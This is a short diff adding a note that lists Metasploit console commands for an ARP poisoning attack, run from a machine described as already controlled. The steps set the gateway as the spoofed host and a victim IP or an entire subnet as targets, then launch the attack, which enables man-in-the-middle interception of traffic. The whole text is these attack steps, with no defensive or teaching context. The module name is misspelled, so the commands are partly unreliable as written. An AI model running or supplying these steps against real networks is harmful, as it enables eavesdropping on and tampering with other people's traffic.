@@ -1,0 +1,7 @@
+
+run in the controlled pc folloing commands in msfconsole
+use auxiliary/spoof/arp/arp_posioning
+set BIDIRECTIONAL true
+set DHOST <the getway address>
+set SHOSTS <the victim ip / the subnet mask to hit all the subnet>
+exploit
